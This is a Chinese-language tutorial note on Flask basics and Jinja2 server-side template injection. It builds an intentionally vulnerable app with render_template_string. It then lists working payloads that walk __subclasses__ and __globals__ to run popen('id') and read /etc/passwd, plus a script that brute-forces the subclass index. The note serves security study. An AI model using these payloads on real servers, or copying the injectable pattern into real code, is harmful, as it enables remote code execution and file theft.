
Flask : 轻量级的 web 框架
##### 安装 Venv

```bash
apt install python3-venv
cd /opt
sudo python -m venv flask1
```

```bash
source /opt/flask1/bin/activate #进入虚拟环境
deactivate #退出虚拟环境
pip install flask
```

- Flask (demo.py)
```python
from flask import * 
app = Flask(__name__)

@app.route('/shabi')
def hellp():
    return "Hello SB!"

if __name__ == '__main__' :
    app.run(host='0.0.0.0',debug=True,port=5000)
```
`* Running on http://127.0.0.1:5000/shabi`

![](photos/Pasted%20image%2020240105225956.png)

##### Flask 变量

```python
from flask import *
app = Flask(__name__)

@app.route('/name/<name>')
def hellp(name):
    return "Hello %s !"%name

if __name__ == '__main__' :
    app.run(host='0.0.0.0',debug=True)
```


##### Flask 模板/传参

**render_template : 加载 html 文件，默认路径在 templates 目录下**

- app.py
```python
from flask import *  
app = Flask(__name__)  
  
@app.route('/')  
def index():  
    my_str = 'Hello SB'  
    my_int = 12  
    my_array = [1,2,3,4]  
    my_dict = {  
       'name' : 'shabi',  
       'age' : '18'  
    }  
    return render_template("index.html",my_str=my_str,my_int=my_int,my_array=my_array,my_dict=my_dict)  
  
if __name__ == '__main__' :  
    app.run(host='0.0.0.0',debug=True)
```

- index.html
```
运行成功  
<br>  
{{ my_str }}  
<br>  
{% set a='shabi' %}{{ a }}
```
![](photos/Pasted%20image%2020240106001901.png)


**动态传输**
-  GET
```python
my_str = request.args.get('cmd')
```
![](photos/Pasted%20image%2020240106002014.png)


**render_template_string : 渲染字符串，直接定义内容**
- app.py
```python
from flask import *
app = Flask(__name__)

@app.route('/')
def index():
    my_str = 'Hello shabi'
    return render_template_string('<html lang="en"><head><meta charset="UTF-8"><title>SB</title></head><body>%s</body></html>' % my_str)


if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0')
```


***

##### SSTI 模板注入漏洞


flask 代码不严谨，对于输入没有严格的过滤；造成任意文件读取， RCE

- app.py
```python
from flask import *  
app = Flask(__name__)  
  
@app.route('/',methods = ["GET"])  
def index():  
    user_input = request.args.get('cmd')  
    html_str = ('<html lang="en">'   
               '<head>'   
               '<meta charset="UTF-8">'   
               '<title>Title</title>'   
               '</head>'  
               '<body>{{user_input}}</body>' # user_imput 被{{}} 包裹起来 ，会被预先渲染转义，然后再输出，不会被渲染执行    
'</html>')  
    return render_template_string(html_str , user_input=user_input)  
  
if __name__ == '__main__' :  
    app.run(host='0.0.0.0',debug=True,port=8080)
```

![](photos/Pasted%20image%2020240106003745.png)

- Exploit app.py
```python
from flask import *  
app = Flask(__name__)  
  
@app.route('/',methods = ["GET"])  
def index():  
    user_input = request.args.get('cmd')  
    html_str = ('<html lang="en">'   
               '<head>'   
               '<meta charset="UTF-8">'   
               '<title>Title</title>'   
               '</head>'  
               '<body>{}</body>'# {} 里面可以定义任意参数  
               '</html>'.format(user_input))  
    return render_template_string(html_str) # 会把{}中的字符串当成代码指令  
  
if __name__ == '__main__' :  
    app.run(host='0.0.0.0',debug=True,port=8080)
```

![](photos/Pasted%20image%2020240106004127.png)

这样就是存在**服务端模板注入漏洞**


- **检测模板注入类型**

![](photos/Pasted%20image%2020240105215901.png)

```
{{1+abcxyz}}${1+abcxyz}<%1+abcxyz%>[abcxyz] //SSTI通用测试payload
```

##### 继承关系和魔术方法

```python
class A:pass  
class B(A):pass  
class C(B):pass  
class D(C):pass  
c=C()  
  
print(c.__class__)  
print(c.__class__.__base__)
```

```
<class '__main__.C'>
<class '__main__.B'>
```

```python
print(c.__class__.__base__.__base__.__base__)
# 到最后都是指向object
<class 'object'>
```

`__mro__`
```python
print(c.__class__.__mro__)
# 显示全部父类关系
(<class '__main__.C'>, <class '__main__.B'>, <class '__main__.A'>, <class 'object'>)
#分别为0,1,2,3
```


**重点**
`__class__` : 查找当前类型属性所属对象
`__base__` : 沿着父子类的关系往上走
`__mro__` : 查找当前类对象的所有继承类
`__subclasses__()` : 查找父类下的所有直接子类
`__init__` : 查看是否被重载
`__globals__` : 查看指令


```
?cmd={{[].__class__.__base__.__subclasses__()}}
```
![](photos/Pasted%20image%2020240106011918.png)

查找可用模块
![](photos/Pasted%20image%2020240106012147.png)

! 注意这边是显示的是140 ，是**从1开始**的，列表是**从0开始**，所以要减一
```
?cmd={{[].__class__.__base__.__subclasses__()[139]}}
```
![](photos/Pasted%20image%2020240106012338.png)

查看是否被重载
```
?cmd={{[].__class__.__base__.__subclasses__()[139].__init__}}
```
![](photos/Pasted%20image%2020240106012548.png)

查看指令
```
?cmd={{[].__class__.__base__.__subclasses__()[139].__init__.__globals__}}
```
![](photos/Pasted%20image%2020240106012828.png)

**执行指令**
```
?cmd={{[].__class__.__base__.__subclasses__()[139].__init__.__globals__['popen']('cat /etc/passwd').read()}}
?cmd={{[].__class__.__base__.__subclasses__()[139].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /etc/passwd').read()")}}
```

`?cmd={{[].__class__.__base__.__subclasses__()[139].__init__.__globals__['popen']('dir').read()}}`
![](photos/Pasted%20image%2020240106013148.png)


#### 常见模块利用

- **查找模块在列表第几位(可改)**
```python
import requests  
url = 'http://127.0.0.1:8080/'  
  
for i in range(500):  
    # data = {"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}  
    payload = "{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"  
    full_url = f"{url}?cmd={payload}"  
    try:  
        # response = requests.post(url,data=data)  
        response = requests.get(full_url)  
        # print(response.text)  
        if response.status_code == 200 and '_frozen_importlib_external.FileLoader' in response.text:  
            print(i)  
    except:  
        pass
```

**文件读取**
` _frozen_importlib_external.FileLoader`
```
{{().__class__.__base__.__subclasses__()[NUM]["get_data"](0,"/etc/passwd")}}
```

`file`
```
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}
```


**查看内置函数 - 命令执行**
```
{{self.__dict__._TemplateReference__context.keys()}}
```

`url_for`
```
{{url_for.__globals__.os.popen('id').read()}}
```

`config`
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

在已经加载的 os 模块子类中调用 （配合 py 脚本）
```
{{[].__class__.__bases__[0].__subclasses__()[NUM].__init__.__globals__['os'].popen('id').read()}}
```

`lipsum`
```
{{lipsum.__globals__.os.popen('id').read()}}
```


#### 自动化工具：

Tplmap : **[Tplmap](../0x02%20Checklist(kalilinux%20Pen%20Testing)/Study%20Note%20New/Tplmap.md)**